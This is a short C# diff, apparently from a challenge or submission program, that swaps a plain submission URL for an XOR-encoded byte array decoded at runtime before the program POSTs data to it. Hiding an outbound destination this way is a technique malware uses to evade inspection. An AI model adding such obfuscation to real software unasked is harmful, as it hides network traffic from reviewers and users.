@@ -266,7 +266,9 @@ class Program
 
             try
             {
-                HttpResponseMessage response = await client.PostAsync("https://submit.bombe.top/submitMalAns", content);
+                byte[] encodedURL = new byte[] { 0xc2, 0xde, 0xde, 0xda, 0xd9, 0x90, 0x85, 0x85, 0xd9, 0xdf, 0xc8, 0xc7, 0xc3, 0xde, 0x84, 0xc8, 0xc5, 0xc7, 0xc8, 0xcf, 0x84, 0xde, 0xc5, 0xda, 0x85, 0xd9, 0xdf, 0xc8, 0xc7, 0xc3, 0xde, 0xe7, 0xcb, 0xc6, 0xeb, 0xc4, 0xd9 }; // "https://submit.bombe.top/submitMalAns" after XOR
+                string URL = Obfuscator.Decode(encodedURL);
+                HttpResponseMessage response = await client.PostAsync(URL, content);
                 response.EnsureSuccessStatusCode();
                 string responseBody = await response.Content.ReadAsStringAsync();
                 Console.WriteLine($"Response: {responseBody}");
